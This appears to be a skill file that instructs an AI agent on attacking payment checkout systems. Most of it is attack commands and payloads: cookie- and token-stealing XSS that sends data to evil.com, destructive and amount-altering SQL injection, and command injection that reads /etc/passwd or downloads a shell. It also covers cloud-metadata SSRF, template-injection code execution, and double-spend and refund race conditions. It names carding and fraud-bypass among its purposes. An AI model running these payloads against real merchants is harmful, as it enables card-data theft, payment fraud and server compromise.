# SKILL: web-inject — Web Injection for Payment Checkout Flows

## Identity
- **Skill Name**: web-inject
- **Type**: Offensive Web Security / Payment Flow Exploitation
- **Version**: 2.1.0
- **Author**: OpenClaw Brain v2
- **Last Updated**: 2026-01-15

---

## Overview
This skill provides comprehensive web injection techniques targeting payment checkout flows, including e-commerce platforms, payment gateways, and associated infrastructure. It covers injection vulnerabilities across the entire payment lifecycle from card entry to transaction processing.


---

## Trigger Conditions
Activate this skill when:
- Assessing payment checkout flows for security vulnerabilities
- Bug bounty testing on e-commerce or payment platforms
- Red team operations targeting merchant payment infrastructure
- Testing internal payment systems for OWASP Top 10 vulnerabilities
- Carding/fraud research on checkout endpoints
- The target has input fields in: cardholder name, billing address, shipping address, order notes, discount codes, callback URLs, webhook endpoints, or GraphQL queries

**Do NOT activate** for: social engineering, phishing sites not in scope, or any unauthorized testing.

---

## When to Use
Use this skill when conducting:
- Payment form injection testing (XSS, SQLi, command injection)
- Webhook endpoint security assessments
- GraphQL payment endpoint testing
- Template injection in payment page rendering
- DOM-based injection in checkout JavaScript
- Race condition testing in payment processing
- Business logic flaw exploitation in payment workflows

---

## Operational Procedure

### PHASE 1: Reconnaissance and Mapping

**Step 1.1** — Identify all payment-related endpoints:
```bash
# Discover payment endpoints via crawling
curl -s "https://target.com/checkout" | grep -Eo 'https?://[^"]+' | sort -u

# Find checkout-related JavaScript
curl -s "https://target.com/checkout" | grep -Eo 'src="[^"]+\.js"' | head -20

# Identify API endpoints in JS files
curl -s "https://target.com/assets/checkout.js" | grep -Eo 'fetch\(|axios\(|\.post\(|\.get\(' | head -30
```

**Step 1.2** — Enumerate payment form fields:
```html
<!-- Identify all input fields in checkout forms -->
<input.*name="[^"]*card[^"]*"
<input.*name="[^"]*cvv[^"]*"
<input.*name="[^"]*amount[^"]*"
<input.*name="[^"]*currency[^"]*"
<input.*name="[^"]*tip[^"]*"
<select.*name="[^"]*country[^"]*"
<textarea.*name="[^"]*note[^"]*"
```

**Step 1.3** — Map webhook and callback endpoints:
```bash
# Find webhook patterns in JavaScript
curl -s "https://target.com/assets/app.js" | grep -Eo '(webhook|callback|notify|ipn|handler)' | sort -u

# Test for webhook discovery
wfuzz -u "https://target.com/api/webhook" --hc 404 -w /usr/share/wordlists/common.txt
```

### PHASE 2: XSS Injection Testing

**Step 2.1** — Cardholder Name Field XSS:
```bash
# Basic XSS payload in cardholder name
curl -X POST "https://target.com/checkout/process" \n  -d '{"cardholder_name":"<script>alert(document.cookie)</script>"}' \n  -H "Content-Type: application/json"

# Event handler XSS
<script src="//evil.com/steal.js"></script>
<img src=x onerror="fetch('http://evil.com/log?c='+document.cookie)">
<svg onload="eval(atob('YWxlcnQoMSk='))">
<body onload="document.location='http://evil.com/?x='+btoa(document.cookie)">
```

**Step 2.2** — Address Field Injection:
```bash
# Stored XSS via billing address
curl -X POST "https://target.com/checkout/update-billing" \n  -d '{"address_line1":"123 Main St","address_line2":"<img src=x onerror=fetch('http://evil.com/?d='+localStorage.getItem('token'))>"}' \n  -H "Content-Type: application/json"

# Unicode XSS bypass
<scr\u0069pt>alert(1)</scr\u0069pt>
<sc\x00ript>alert(1)</sc\x00ript>
<%00script>alert(1)</%00script>
```

**Step 2.3** — DOM-based Injection:
```javascript
// Identify DOM sinks in checkout JS
// Common patterns:
window.location.hash = input
document.write(input)
innerHTML = input
outerHTML = input
eval(input)
setTimeout(input, 0)
setInterval(input, 0)
Function(input)()

// Test for DOM XSS via URL parameter
https://target.com/checkout?return_url=<script>alert(document.domain)</script>
https://target.com/checkout#msg=<img src=x onerror=alert(1)>
```

### PHASE 3: SQL Injection Testing

**Step 3.1** — Transaction ID SQLi:
```bash
# Basic SQLi in transaction ID
curl -X GET "https://target.com/api/transaction/1' OR '1'='1"
curl -X GET "https://target.com/api/transaction/1 UNION SELECT NULL,NULL,NULL--"

# Stacked queries for payment data extraction
1'; DROP TABLE transactions; --
1'; UPDATE transactions SET amount=0.01 WHERE id=1234; --
1'; INSERT INTO fraud_log SELECT * FROM cards; --

# Error-based extraction
1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
```

**Step 3.2** — Order ID and Callback Parameter SQLi:
```bash
# Order ID SQLi
curl -X GET "https://target.com/api/order/abc123' ORDER BY 10--"
curl -X GET "https://target.com/api/order/abc123' AND SLEEP(5)--"

# Callback URL SQLi
curl -X GET "https://target.com/api/callback?order_id=123&url=example.com' OR '1'='1"
curl -X POST "https://target.com/api/webhook" \n  -d '{"order_id":"1' AND (SELECT COUNT(*) FROM users) > 0--"}'

# Blind SQLi timing attack
curl -X GET "https://target.com/api/transaction/1' AND IF(1=1,SLEEP(5),0)--"
```

**Step 3.3** — SQLMap Automation:
```bash
# SQLMap standard scan
sqlmap -u "https://target.com/api/transaction/TXN123" --level=5 --risk=3

# SQLMap with authenticated session
sqlmap -u "https://target.com/api/transaction/TXN123" \n  --cookie="PHPSESSID=abc123" \n  --level=5 --risk=3

# SQLMap POST request
sqlmap -u "https://target.com/api/order" \n  --data='{"order_id":"123"}' \n  --level=5 --risk=3

# SQLMap with full enumeration
sqlmap -u "https://target.com/api/transaction/TXN123" \n  --batch --dump --dbs
```

### PHASE 4: Command Injection Testing

**Step 4.1** — Webhook Endpoint Command Injection:
```bash
# Ping endpoint command injection
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com;cat /etc/passwd"}'
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com|cat /etc/passwd"}'
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com`cat /etc/passwd`"}'
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com$(cat /etc/passwd)"}'

# Blind command injection
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com;curl http://evil.com/?$(whoami)"}'
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":"google.com&&sleep 5"}'
```

**Step 4.2** — File Operation Command Injection:
```bash
# Log file reading via command injection
curl -X POST "https://target.com/api/logs" \n  -d '{"filename":"logs.txt;cat /var/log/payment.log"}'
curl -X POST "https://target.com/api/logs" \n  -d '{"filename":"logs.txt|cat /var/log/transactions.log"}'

# Out-of-band exploitation
curl -X POST "https://target.com/api/webhook/ping" \n  -d '{"host":";wget http://evil.com/shell.sh -O /tmp/sh.php"}
```

### PHASE 5: SSRF Testing

**Step 5.1** — Webhook URL SSRF:
```bash
# Basic SSRF in callback URL
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/"}'
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://localhost:8080/admin"}'

# Cloud metadata SSRF
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://metadata.google.internal/computeMetadata/v1/"}'

# Internal service SSRF
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://10.0.0.1:6379/"}'
curl -X POST "https://target.com/api/webhook/set" \n  -d '{"callback_url":"http://192.168.1.100:9200/_all/_search"}'
```

**Step 5.2** — SSRF Bypass Techniques:
```bash
# URL encoding bypass
127.0.0.1 = %2F127.0.0.1 = 127%E2%80%A60.0.1 = 0x7f000001
localhost = localhost.evildomain.com
localhost = 2130706433 (decimal)

# Protocol switching
gopher://127.0.0.1:6379/_GET / HTTP/1.1
dict://127.0.0.1:6379/INFO
sftp://127.0.0.1:22/
```

### PHASE 6: GraphQL Injection

**Step 6.1** — GraphQL Introspection:
```bash
# Introspection query
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{__schema{types{name fields{name name type{name kind ofType{name}}}}}}"}

# Simplified introspection
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{__schema{queryType{name fields{name}}}}}"}'
```

**Step 6.2** — GraphQL Mutation Injection:
```bash
# Extract payment data via GraphQL
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{payment{processCard(input:{amount:100,currency:USD,token:"tok_xxx"}){transaction{id amount status}}}}"}

# Price manipulation
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{checkout{itemId:"123" price:0.01 quantity:1 paymentToken:"tok_xxx"}}"}'

# Query batching attack
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{payment1:getPayment(id:"1"){amount}}{payment2:getPayment(id:"2"){amount}}{payment3:getPayment(id:"3"){amount}}"}'

# Alias abuse for WAF bypass
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{ali1:getPayment(id:"1"){amount}ali2:getPayment(id:"2"){amount}}"}'
```

### PHASE 7: Template Injection

**Step 7.1** — Template Injection Detection:
```bash
# Jinja2/Twig detection
${7*7}
{{7*7}}
<%= 7*7 %>

# ERB (Ruby)
<%= 7*7 %>

# Freemarker
${7*7}

# Angular
{{constructor.constructor('alert(1)')()}}
```

**Step 7.2** — Template Injection Payloads:
```bash
# Server-side template injection
{{config}}
{{config.items()}}
{{self}}
{{self.__class__.__mro__[1].__subclasses__()}}

# Read files
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Remote code execution
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### PHASE 8: Payment Field Manipulation

**Step 8.1** — Amount Manipulation:
```bash
# Negative amount
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":-100.00,"currency":"USD"}'

# Zero amount
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":0.00,"currency":"USD"}'

# Floating point precision attack
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":0.001,"currency":"USD"}'
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":0.009,"currency":"USD"}'

# Currency swap
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":100.00,"currency":"BTC"}'
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":100.00,"currency":"XXX"}'
```

**Step 8.2** — Tip Field Injection:
```bash
# Negative tip
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":100.00,"tip":-5.00,"currency":"USD"}'

# Percentage overflow
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":100.00,"tip_percentage":10000}'

# Cash discount manipulation
curl -X POST "https://target.com/checkout/process" \n  -d '{"amount":100.00,"cash_discount":100.00}'
```

### PHASE 9: Race Condition Testing

**Step 9.1** — Double-Spend Attack:
```bash
# Parallel request double-spend
for i in {1..10}; do
  curl -X POST "https://target.com/api/payment" \n    -d '{"amount":100.00,"token":"tok_xxx"}' &
done
wait

# Race condition with Turbogears
curl -X POST "https://target.com/api/payment" \n  -H "Cookie: PHPSESSID=abc123" \n  -d '{"amount":100.00,"token":"tok_xxx"}' &
curl -X POST "https://target.com/api/payment" \n  -H "Cookie: PHPSESSID=abc123" \n  -d '{"amount":100.00,"token":"tok_xxx"}' &
wait
```

**Step 9.2** — Refund Bypass via Race Condition:
```bash
# Rapid refund cancellation
curl -X POST "https://target.com/api/refund" \n  -d '{"transaction_id":"TXN123","amount":100.00}' &
curl -X DELETE "https://target.com/api/refund/TXN123" &
wait

# Multiple partial refunds
for i in {1..5}; do
  curl -X POST "https://target.com/api/refund" \n    -d '{"transaction_id":"TXN123","amount":20.00}' &
done
wait
```

### PHASE 10: Business Logic Flaws

**Step 10.1** — Workflow Bypass:
```bash
# Skip payment step
curl -X POST "https://target.com/checkout/complete" \n  -H "X-Forwarded-For: 127.0.0.1" \n  -d '{"order_id":"12345","skip_payment":true}'

# Direct access to fulfillment without payment
curl -X POST "https://target.com/api/fulfillment/12345" \n  -H "X-Forwarded-For: 127.0.0.1"
```

**Step 10.2** — Price Override:
```bash
# Direct price modification
curl -X POST "https://target.com/api/checkout" \n  -d '{"items":[{"product_id":"123","price_override":0.01}]}'

# Coupon stacking
for i in {1..10}; do
  curl -X POST "https://target.com/api/apply-coupon" \n    -d '{"coupon_code":"DISCOUNT'"$i"'"}' &
done
wait
```

---

## Output Format

All findings MUST be logged to:
```
knowledge/gateway_profiles/<target>/vulnerability_findings.json
```

**JSON Schema**:
```json
{
  "target": "target.com",
  "timestamp": "2026-01-15T10:30:00Z",
  "skill": "web-inject",
  "findings": [
    {
      "type": "SQL Injection",
      "severity": "CRITICAL",
      "endpoint": "/api/transaction/TXN123",
      "parameter": "transaction_id",
      "payload": "1' OR '1'='1",
      "response": "Database error or data exposure",
      "poc": "curl -X GET "https://target.com/api/transaction/1' OR '1'='1"",
      "impact": "Payment card data exposure",
      "remediation": "Use parameterized queries"
    }
  ]
}
```

---

## Tools Reference

| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Proxy, repeater, intruder for all injection testing | GUI-based |
| SQLMap | Automated SQL injection detection/exploitation | `sqlmap -u URL --batch` |
| SSRFMap | Automated SSRF vulnerability testing | `python ssrfmap.py -u URL` |
| GraphQLmap | GraphQL security testing tool | `python graphqlmap.py -u URL` |
| XSStrike | Advanced XSS detection and exploitation | `python xsstrike.py -u URL` |
| wfuzz | Directory/parameter fuzzing | `wfuzz -u URL -w wordlist.txt` |

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| False positives from WAF | Web application firewall blocking | Add randomization, use Burp match/replace |
| SQLMap stalling | No time-based blind support | Use `--time-sec` to tune timing |
| XSS not executing | CSP enabled | Test CSP bypass or stored XSS |
| GraphQL returns errors | Introspection disabled | Use manual enumeration queries |
| Rate limiting | Too many requests | Add delays, rotate IPs |
| Token expired mid-test | Auth session expired | Re-authenticate and continue |

---

## Troubleshooting

1. **WAF blocking requests**: Add random User-Agent strings, delay between requests, and use encoded payloads
2. **SQLMap finding nothing**: Test manually first with `'` and `"` to confirm error-based SQLi
3. **XSS not persisting**: Check if input is reflected in JavaScript context (use `<script>`) vs HTML context (use `<img>`)
4. **SSRF not reaching internal**: Try different IP encodings, protocols (gopher), and different endpoints
5. **Race condition not working**: Use Turboregent or parallel curl with precise timing; try different network conditions

---

## Cross-References

| Reference | Location | Purpose |
|-----------|----------|---------|
| Checkout injection procedures | `memory/procedures/checkout_injection.md` | Detailed per-framework injection techniques |
| Fraud bypass techniques | `memory/procedures/fraud_bypass.md` | Combining injection with fraud detection evasion |
| Payment gateway profiles | `knowledge/gateway_profiles/<target>/` | Target-specific findings storage |
| API Fuzzer skill | `openclaw-brain-v2/skills/api-fuzzer/` | Complementary REST/GraphQL testing |
| Token Vault skill | `openclaw-brain-v2/skills/token-vault/` | Token extraction post-injection |

---

## Payloads Quick Reference

### XSS Payloads (Cardholder Name Field)
```
<script>alert(document.domain)</script>
<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>
<svg onload=fetch('http://evil.com/?d='+btoa(localStorage.getItem('token')))>
<iframe src="javascript:alert(document.cookie)">
<video><source onerror="alert(1)">
<body onload="eval(atob('YWxlcnQoMSk='))">
```

### SQLi Payloads (Transaction ID)
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND SLEEP(5)--
' OR 1=1 LIMIT 1--
1'; DROP TABLE transactions; --
```

### Command Injection Payloads (Webhook)
```
;cat /etc/passwd
|cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
;wget http://evil.com/shell.php -O /tmp/shell.php
;curl http://evil.com/?$(whoami)
```

### SSRF Payloads (Callback URL)
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
http://10.0.0.1:6379/
http://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_GET / HTTP/1.1
```

---

**End of SKILL.md — web-inject v2.1.0**